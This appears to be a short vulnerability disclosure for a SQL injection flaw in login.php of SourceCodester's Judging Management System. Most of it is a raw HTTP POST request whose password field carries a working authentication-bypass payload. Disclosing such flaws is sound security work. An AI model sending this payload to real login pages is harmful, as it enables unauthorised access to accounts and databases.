**BUG_Author:**

Rone

**Vendor:**

[SourceCodester](https://vuldb.com/?vendor.sourcecodester)

**Software:**

[Judging Management System using PHP and MySQL Free Source Code | SourceCodester](https://www.sourcecodester.com/php/15910/judging-management-system-using-php-and-mysql-free-source-code.html)

**Vulnerability File:**

login.php

**Description:**

Attackers can use SQL injection to bypass the authentication and authorization mechanisms of web applications and retrieve the content of the entire database. SQLi can also be used to add, modify, and delete records in a database, thereby affecting data integrity. In appropriate cases, attackers can also use SQLi to execute operating system commands, which can then be used to launch further attacks.

```
POST /php-jms/login.php HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

password=-1' OR 3*2*1=6 AND 1=1 --+ &username=qeNtfPNC
```

![image-20231015182149405](https://github.com/GodRone/Judging-Management-System_SQL-injection/blob/main/Judging%20Management%20System_SQL%20injection.assets/image-20231015182149405.png)

![image-20231015182202919](https://github.com/GodRone/Judging-Management-System_SQL-injection/blob/main/Judging%20Management%20System_SQL%20injection.assets/image-20231015182202919.png)

![image-20231015221910813](https://github.com/GodRone/Judging-Management-System_SQL-injection/blob/main/Judging%20Management%20System_SQL%20injection.assets/image-20231015221910813.png)











